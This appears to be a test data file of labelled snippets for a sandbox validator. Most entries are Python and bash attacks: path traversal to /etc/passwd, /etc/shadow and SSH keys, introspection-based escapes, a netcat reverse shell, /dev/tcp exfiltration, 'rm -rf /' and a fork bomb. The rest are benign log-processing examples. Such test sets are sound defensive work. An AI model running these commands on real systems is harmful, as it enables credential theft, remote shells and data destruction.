@@ -1,0 +1,477 @@
+{"lang": "python", "code": "print(open(\"/etc/passwd\").read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(open(\"/work/input/../../etc/passwd\").read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(open(\"/work/input/../../../etc/passwd\").read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").glob(\"../../../etc/passwd\"):\n print(f.read_text())", "kind": "attack", "note": "glob traversal"}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").rglob(\"../../../etc/*\"):\n print(f)", "kind": "attack", "note": "rglob traversal"}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").glob(\"../../*\"):\n print(open(str(f)).read())", "kind": "attack", "note": "glob then open loopvar"}
+{"lang": "python", "code": "import os\nprint(os.environ)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nprint(os.system(\"id\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import subprocess\nsubprocess.run([\"id\"])", "kind": "attack", "note": ""}
+{"lang": "python", "code": "__import__(\"os\").system(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "eval(\"__import__('os').system('id')\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "exec(\"import os; os.system('id')\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "getattr(__builtins__,\"eval\")(\"1\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "().__class__.__bases__[0].__subclasses__()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "[x for x in ().__class__.__mro__]", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print((lambda:1).__globals__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "f\"{().__class__}\"", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x=().__class__;print(x)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os as _o\nprint(_o.system(\"id\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from os import system\nsystem(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from os import environ\nprint(environ)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import importlib\nimportlib.import_module(\"os\").system(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "help()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(breakpoint)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import ctypes", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import socket\nsocket.socket()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import shutil\nshutil.rmtree(\"/work\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import pickle\npickle.loads(b\"\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import pty\npty.spawn(\"sh\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.popen(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.fork()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys\nprint(sys.modules)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys\nprint(sys.__dict__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "globals()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "locals()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "vars()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "dir(object)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "type(\"x\",(),{})", "kind": "attack", "note": ""}
+{"lang": "python", "code": "compile(\"1\",\"\",\"eval\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "a=\"__imp\"+\"ort__\"\nprint(a)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "g=globals\ng()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "class X:\n def __init__(self):\n  import os\n  os.system(\"id\")\nX()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "@property\ndef f(x):import os;os.system(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "(lambda o=__import__: o(\"os\").system(\"id\"))()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(().__doc__.__class__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.getcwd()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nprint(os.getpid())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.chmod(\"/work/out/x\",0o777)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nPath(\"/work/out/x\").chmod(0o777)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nPath(\"/etc/x\").write_text(\"h\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nPath(\"/work/out/../../../etc/x\").write_text(\"h\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/work/out/../../etc/cron.d/x\",\"w\").write(\"* * * * * root id\\n\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/proc/self/mem\",\"rb\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/dev/mem\",\"rb\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import io\nio.open(\"/etc/passwd\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import gzip\ngzip.open(\"/etc/shadow\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import zipfile\nzipfile.ZipFile(\"/work/out/x.zip\",\"w\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "p=\"/etc/\"+\"passwd\"\nopen(p).read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(chr(47)+\"etc\"+chr(47)+\"passwd\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"\\x2fetc\\x2fpasswd\").read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "fd=open(\"/work/input/a\").fileno()\nopen(fd).read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(0).read()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.open(\"/etc/passwd\",0)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import asyncio\nasyncio.run(__import__(\"os\").system(\"id\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "async def f():\n import os\n os.system(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "(x:=__import__)(\"os\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "match 1:\n case _: import os", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os,sys", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from . import x", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from os import *", "kind": "attack", "note": ""}
+{"lang": "python", "code": "exec(compile(\"import os\",\"\",\"exec\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(\"\".__class__.__mro__[1].__subclasses__())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(str.maketrans)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "t=__builtins__\nprint(t)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import builtins\nbuiltins.eval(\"1\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "b=__import__(\"builtins\")\nb.open(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(().__class__.__base__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "e=[].__class__\nprint(e)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(object.__subclasses__())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(().__reduce__())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import functools\nfunctools.reduce(lambda a,b:a,[1])", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import operator\nprint(operator.methodcaller(\"read\")(open(\"/etc/passwd\")))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import operator\nprint(operator.itemgetter(0))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import json\njson.loads(open(\"/etc/passwd\").read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import re\nre.compile(\"(?P<x>.)\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x=getattr\nprint(x(list,\"append\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "setattr(object,\"x\",1)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "delattr(list,\"append\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.environ.get(\"SECRET\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(__loader__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(__spec__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(__file__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os.path\nprint(os.path.__dict__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "def f(a=open):return a(\"/etc/passwd\")\nf()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x = open if True else None\nx(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import codecs\ncodecs.open(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import tempfile\ntempfile.mktemp()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import glob\nglob.glob(\"/etc/*\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import fileinput\nfileinput.input(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import linecache\nlinecache.getline(\"/etc/passwd\",1)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.scandir(\"/etc\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.walk(\"/\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nlist(os.listdir(\"/etc\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nprint(os.listdir(\"/etc\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nprint(os.path.getsize(\"/etc/passwd\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import pathlib\nprint(list(pathlib.Path(\"/etc\").iterdir()))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nprint(Path(\"/etc/passwd\").read_text())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nprint(Path(\"/\").glob(\"etc/passwd\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\np=Path(\"/etc\")\nprint(p.read_text())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import mmap", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import multiprocessing", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import threading\nthreading.Thread().start()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import resource", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import signal\nsignal.alarm(1)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import faulthandler", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import gc\nprint(gc.get_objects())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import inspect", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import traceback\ntraceback.extract_stack()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import platform\nplatform.uname()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import getpass\ngetpass.getuser()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import pwd\npwd.getpwall()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import grp", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import crypt", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import termios", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import fcntl", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import select", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import ssl", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import http.client", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import ftplib", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import telnetlib", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import smtplib", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import xmlrpc.client", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import ctypes.util", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import cffi", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import setuptools", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import distutils", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x=[0]*(10**12)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "b=bytearray(10**12)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "s=\"a\"*(10**12)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x=2**10000000", "kind": "attack", "note": ""}
+{"lang": "python", "code": "while True:pass", "kind": "attack", "note": ""}
+{"lang": "python", "code": "def r():r()\nr()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import itertools\nlist(itertools.count())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "[0 for _ in range(10**12)]", "kind": "attack", "note": ""}
+{"lang": "python", "code": "{i:i for i in range(10**12)}", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.putenv(\"X\",\"Y\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.getenv(\"SECRET\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "with open(\"/work/input/../out/../../etc/passwd\") as f:print(f.read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/work//input/../../etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/work/./input/../../etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"./../etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"../../../../etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/work/input/\\u002e\\u002e/\\u002e\\u002e/etc/passwd\")", "kind": "attack", "note": "unicode dots"}
+{"lang": "python", "code": "open(\"/WORK/INPUT/../../etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.symlink(\"/etc/passwd\",\"/work/out/l\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nPath(\"/work/out/l\").symlink_to(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nPath(\"/work/out/l\").hardlink_to(\"/etc/passwd\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "open(\"/work/out/l\").read()  # after symlink", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import tarfile\ntarfile.open(\"/work/input/x.tar\").extractall(\"/\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.replace(\"/work/out/a\",\"/etc/x\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os\nos.truncate(\"/etc/passwd\",0)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(memoryview(b\"x\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import array\narray.array(\"b\",[0]*10**12)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import numpy", "kind": "attack", "note": "numpy not allowed"}
+{"lang": "python", "code": "import requests", "kind": "attack", "note": "not allowed"}
+{"lang": "python", "code": "__builtins__[\"__import__\"](\"os\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "(1).__class__.__bases__", "kind": "attack", "note": ""}
+{"lang": "python", "code": "True.__class__", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(type(1).__mro__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os; getattr(os,\"sys\"+\"tem\")(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import os; m=\"system\"; getattr(os,m)(\"id\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import string; string.Formatter().vformat(\"{0.__class__}\",[1],{})", "kind": "attack", "note": ""}
+{"lang": "python", "code": "\"{0.__class__}\".format(1)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "\"{.__class__}\".format(1)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "\"%s\"%().__class__", "kind": "attack", "note": ""}
+{"lang": "python", "code": "f\"{open}\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/shadow", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /proc/self/environ", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/input/../../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "whoami", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "uname -a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ps aux", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "env", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "curl http://1.1.1.1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "wget http://x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "nc -e /bin/sh 1.1.1.1 4444", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "bash -i", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sh -c \"id\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "/bin/sh", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "python3 -c \"import os;os.system('id')\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "perl -e \"system('id')\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo hi > /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat < /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat <<< \"$(cat /etc/passwd)\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat <<EOF\n$(id)\nEOF", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo $(id)", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo `id`", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd | grep root", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/pass* ", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/pas?wd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /e*c/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat ${HOME}/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat $IFS/etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "IFS=,;cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "X=/etc/passwd; cat $X", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat \"$X\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "eval cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd &", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd; id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd && id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd || id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "( id )", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "{ id; }", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat <(id)", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "diff <(id) <(id)", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "tee /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sed -i \"s/x/y/\" /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sed \"e id\" /work/input/a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sed \"w /etc/passwd\" /work/input/a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sed \"r /etc/passwd\" /work/input/a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "awk \"BEGIN{system(\\\"id\\\")}\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "awk \"BEGIN{while((getline<\\\"/etc/passwd\\\")>0)print}\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "awk \"BEGIN{print ENVIRON[\\\"SECRET\\\"]}\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "find / -name passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "find /work -exec id {} \\;", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "find . -exec cat /etc/passwd \\;", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "xargs id < /dev/null", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ls / | xargs cat", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "tar -cf /work/out/x.tar --checkpoint=1 --checkpoint-action=exec=id .", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "tar xf /work/input/x.tar -C /", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "git -c core.pager=id log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "git log --output=/etc/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "grep -r root /etc", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "grep --include=* x /", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "busybox id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "busybox sh", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "/bin/busybox nc", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ln -s /etc/passwd /work/out/l", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "chmod 777 /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "chown root /work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "rm -rf /", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "mv /work/out/a /etc/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cp /etc/passwd /work/out/", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "dd if=/etc/passwd of=/work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "head /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "tail -f /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "wc -l /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cut -d: -f1 /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sort /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sort --compress-program=id x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "jq -n env", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "jq -n '$ENV'", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "jq --rawfile x /etc/passwd -n 1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "jq -n input_filename", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "printf \"%s\" \"$(cat /etc/passwd)\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo ${PATH}", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo ${SECRET}", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "export X=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd 2>/dev/null", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd 1>/work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "while true; do :; done", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "for i in 1 2; do id; done", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "case x in *) id;; esac", "kind": "attack", "note": ""}
+{"lang": "bash", "code": ":(){ :|:& };:", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd #comment", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd\nid", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "\\cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "c\"\"at /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ca\\t /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "'cat' /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "$(echo cat) /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "command cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "exec cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "time id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "nohup id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "env -i id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "PATH=/bin id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "LD_PRELOAD=/x id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /etc/passwd > /dev/tcp/1.1.1.1/80", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "read x < /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "mapfile x < /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "source /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": ". /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "trap id EXIT", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo * ", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ls -la /", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ls /root", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat ~/.ssh/id_rsa", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cd /etc && cat passwd", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import re\nc=0\nfor line in open(\"/work/input/app.log\"):\n if \"ERROR\" in line:c+=1\nprint(c)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import json\nd=json.load(open(\"/work/input/data.json\"))\nprint(len(d))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from collections import Counter\nc=Counter()\nfor l in open(\"/work/input/access.log\"):\n c[l.split()[0]]+=1\nprint(c.most_common(5))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import csv\nfor row in csv.reader(open(\"/work/input/metrics.csv\")):\n print(row[0])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "print(sum(1 for _ in open(\"/work/input/app.log\")))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import re\npat=re.compile(r\"(\\d+\\.\\d+\\.\\d+\\.\\d+)\")\nfor l in open(\"/work/input/a.log\"):\n m=pat.search(l)\n if m:print(m.group(1))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from datetime import datetime\nprint(datetime.now())", "kind": "benign", "note": ""}
+{"lang": "python", "code": "with open(\"/work/out/summary.txt\",\"w\") as f:\n f.write(\"ok\")", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import statistics\nvals=[float(x) for x in open(\"/work/input/nums.txt\")]\nprint(statistics.mean(vals))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "data=open(\"/work/input/log.txt\").read()\nprint(data.count(\"timeout\"))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "lines=open(\"/work/input/app.log\").readlines()\nprint(lines[-10:])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import json\nout={\"errors\":5}\nopen(\"/work/out/r.json\",\"w\").write(json.dumps(out))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "errs=[l for l in open(\"/work/input/app.log\") if \"500\" in l]\nprint(len(errs))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nfor p in Path(\"/work/input\").glob(\"*.log\"):\n print(p.name)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nfor p in Path(\"/work/input\").iterdir():\n print(p)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nprint(Path(\"/work/input/app.log\").read_text()[:100])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import gzip\nprint(gzip.open(\"/work/input/app.log.gz\").read()[:50])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import collections\nd=collections.defaultdict(int)\nfor l in open(\"/work/input/a.log\"):\n d[l[:10]]+=1\nprint(dict(d))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "text=open(\"/work/input/x.txt\").read()\nwords=text.split()\nprint(len(words))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import hashlib\nprint(hashlib.sha256(open(\"/work/input/a\",\"rb\").read()).hexdigest())", "kind": "benign", "note": ""}
+{"lang": "python", "code": "nums=sorted(int(x) for x in open(\"/work/input/n.txt\"))\nprint(nums[:5])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import re\nprint(len(re.findall(\"WARN\",open(\"/work/input/app.log\").read())))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "total=0\nfor l in open(\"/work/input/sizes.txt\"):\n total+=int(l)\nprint(total)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import itertools\nprint(list(itertools.islice(open(\"/work/input/a.log\"),5)))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "d={}\nfor l in open(\"/work/input/kv.txt\"):\n k,v=l.split(\"=\")\n d[k]=v\nprint(len(d))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "print([l.strip() for l in open(\"/work/input/a.log\") if l.startswith(\"2024\")][:3])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import json\nevents=[json.loads(l) for l in open(\"/work/input/events.jsonl\")]\nprint(len(events))", "kind": "benign", "note": ""}
